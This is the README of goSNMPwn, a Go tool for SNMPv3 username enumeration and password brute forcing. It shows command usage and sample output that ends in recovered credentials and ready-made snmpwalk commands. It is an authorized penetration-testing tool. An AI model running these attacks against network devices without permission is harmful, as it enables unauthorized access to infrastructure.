# SNMPv3 Brute Force Tool

A multi-threaded SNMPv3 authentication testing tool written in Go. This tool can perform username enumeration, basic SNMP enumeration, and password brute forcing with support for various authentication and privacy protocols. It can do this over both UDP and TCP.

## A note of caution
Go easy with the workers. The default is 10 but even that might be too much for some hosts. I tested up to 60 against Ubuntu on a local VM and the most I saw the CPU spike to was 10%. That might not be the case for network devices, so be sensible!

## Features

- SNMPv3 username enumeration
- Basic SNMP enumeration
- Password brute force with multi-threading
- Support for multiple authentication protocols (MD5, SHA, SHA224, SHA256, SHA384, SHA512)
- Support for multiple privacy protocols (AES, DES)
- Support for all SNMPv3 security levels (noAuthNoPriv, authNoPriv, authPriv)
- Progress tracking and detailed output
- TCP and UDP support

## Usage

### Basic Enumeration
~~~bash
./goSNMPwn --enum -ips 10.10.10.1 -protocol udp [-port 161]
=== Testing IP: 10.10.10.1 ===

SNMP Engine Details:
Authorization Engine ID (hex): 80001f88804cb907288c06ae6700000000
Authorization Engine Boots: 4
Authorization Engine Time: 12753

Parsed Authorization Engine ID:
Engine ID Format: 8
Enterprise ID: net-snmp (8072)
MAC Address: 4c:b9:07:28:8c:06
~~~

### Username Enumeration
User enumeration relies on the fact that SNMP responds in a specific way when users dont exist. This allows us to use large lists of potential users to enumerate valid ones prior to brute forcing.

~~~bash
./goSNMPwn --userenum -ips 10.10.10.1 -userfile testusers.txt [-port 161]

[!] Skipping username 'thiswontbevalidifitsreturnedforreal' - exceeds 32 character limit
[*] Starting user enumeration with 10 workers
[*] Testing 7 usernames against 1 IPs
[+] Valid username found on 192.168.26.11: snmpuser1 (Identified due to lack of 'unknown username' error)
[+] Valid username found on 192.168.26.11: cisco (Identified due to lack of 'unknown username' error)
[-] Testing username private on 192.168.26.11 (7/7): Invalid user
[-] Testing username public on 192.168.26.11 (6/7): Invalid user
[-] Testing username snmpforti on 192.168.26.11 (4/7): Invalid user
[-] Testing username admin on 192.168.26.11 (5/7): Invalid user
[+] Valid username found on 192.168.26.11: snmp (Identified due to lack of 'unknown username' error)

Valid usernames saved to: foundusers_20250213_185106.txt

~~~

As you can see, it drops these to a file so we can use them in further attacks. The output also tells us why we think the user is valid or invalid. As we said previously, SNMPv3 will return a specific message to tell us a user is not valid, if we do not see that, we assume the user is valid. I print the reason just in case we see edge cases, but we should assume some level of unreliability. 

We might also classify a user as valid because SNMP returns an authentication failure, which it will not do for invalid users:

~~~bash
[+] Valid username found on 192.168.26.11: admin (Authentication failure)
~~~

A good process is to check the difference in responses between what goSNMPwn has identified as valid, and invalid. So we would take 'admin' from the above example, and then also use a randomly generated username and check the differences with SNMPWalk:

~~~
snmpwalk -v3 -l authNoPriv -u admin -a MD5 -A password -t 2 -r 2 192.168.26.11
No log handling enabled - using stderr logging
snmpwalk: Authentication failure (incorrect password, community or key)
~~~

We can see that we actually get an `Authentication failure` message back, but do we get these for invalid users too?

~~~
snmpwalk -v3 -l authNoPriv -u terrycruise -a MD5 -A password -t 2 -r 2 192.168.26.11
No log handling enabled - using stderr logging
snmpwalk: Unknown user name
~~~

The answer in this case is no. But let's assume we haven't identified all edge cases and maybe validate some to be safe before reporting them, or report them with a caveat.

### Password Brute Force

We should default to using the foundusers file generated during userenum. When we do this, we do not need to specify the IP addresses with the `-ips` or `-ipfile` flags because the file contains IP:User combos, so we can just...

~~~
./goSNMPwn --brute --userfile foundusers_20250213_185106.txt --passfile passwords.txt [-port 161] -workers 60
~~~



~~~bash
./goSNMPwn --brute -ips 10.10.10.1 -userfile testusers.txt -passfile passwords.txt [-port 161] -workers 60
[*] Starting brute force with 60 workers
[*] Total combinations to test: 1272362
[*] Combinations breakdown:
    - NULL Auth: 2 (users:2)
    - AuthNoPriv: 2760 (users:2 × passwords:230 × auth_protocols:6)
    - AuthPriv: 1269600 (users:2 × passwords:230 × enc_passwords:230 × auth_protocols:6 × priv_protocols:2)
    - Total combinations: 1272362
[*] [NULL Auth] Testing cisco@10.10.10.1 (1/1272362)
[*] [AuthNoPriv] Testing cisco@10.10.10.1 (Protocol:SHA Auth:crest) (2/1272362)
[*] [AuthPriv] Testing cisco@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:crest) (3/1272362)
[*] [NULL Auth] Testing snmp@10.10.10.1 (4/1272362)
[*] [AuthNoPriv] Testing snmp@10.10.10.1 (Protocol:SHA Auth:crest) (5/1272362)
[*] [AuthPriv] Testing snmp@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:crest) (6/1272362)
[*] [AuthPriv] Testing cisco@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:none) (7/1272362)
[*] [AuthPriv] Testing snmp@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:none) (8/1272362)
[*] [AuthPriv] Testing cisco@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:PASSWORD) (9/1272362)
[*] [AuthPriv] Testing snmp@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:PASSWORD) (10/1272362)
[*] [AuthPriv] Testing cisco@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:traffic) (11/1272362)
[*] [AuthPriv] Testing snmp@10.10.10.1 (Protocols:SHA/AES Auth:crest Priv:traffic) (12/1272362)
---snip---
[+] [AuthPriv] SUCCESS: cisco@10.10.10.1 (Protocols:MD5/AES Auth:password Priv:password)
[*] [AuthNoPriv] Testing cisco@10.10.10.1 (Protocol:MD5 Auth:sonicwall) (6346/30362)

Valid Users:
==================
|---------------|----------|-----------|---------------|---------------|---------------|---------------|---------------------------------------------------------------------------------------|
|     HOST      | USERNAME | AUTH TYPE | AUTH PROTOCOL | AUTH PASSWORD | PRIV PROTOCOL | PRIV PASSWORD |                                        COMMAND                                        |
|---------------|----------|-----------|---------------|---------------|---------------|---------------|---------------------------------------------------------------------------------------|
| 10.10.10.1    | snmp     | authPriv  | SHA           | password      | AES           | password      | snmpwalk -v3 -l authPriv -u snmp -a SHA -A password -x AES -X password 10.10.10.1  |
|---------------|----------|-----------|---------------|---------------|---------------|---------------|---------------------------------------------------------------------------------------|
| 10.10.10.1    | cisco    | authPriv  | MD5           | password      | AES           | password      | snmpwalk -v3 -l authPriv -u cisco -a MD5 -A password -x AES -X password 10.10.10.1 |
|---------------|----------|-----------|---------------|---------------|---------------|---------------|---------------------------------------------------------------------------------------|
~~~
The tool will automatically skip to the next user when it finds a working credential pair to save time.
The tool provides you the SNMP Walk string required to validate this for yourself.

## Password Lists
I included some basic ones for both the password and encryption passphrases, but you should really build your own to suit the environment you are testing. Worth considering that there are a lot of potential combinations to go through anyway, as systems can be configured with a per user encryption & hash algorithm + a password and encryption password.

## Command Line Arguments

- `-ips`: Comma-separated list of IP addresses to test
- `-ipfile`: File containing list of IPs (one per line)
- `-userfile`: File containing usernames to test
- `-passfile`: Password list for brute force
- `-encfile`: File containing encryption passwords (optional)
- `-enum`: Perform basic SNMP enumeration
- `-userenum`: Perform username enumeration
- `-brute`: Perform password brute force
- `-protocol`: SNMP protocol to use (udp or tcp)
- `-workers`: Number of concurrent workers for brute force (default: 10)
- `-port`: SNMP port number (default: 161)


## Security Considerations

This tool is intended for authorized security testing only. Ensure you have permission to test the target systems before use. 

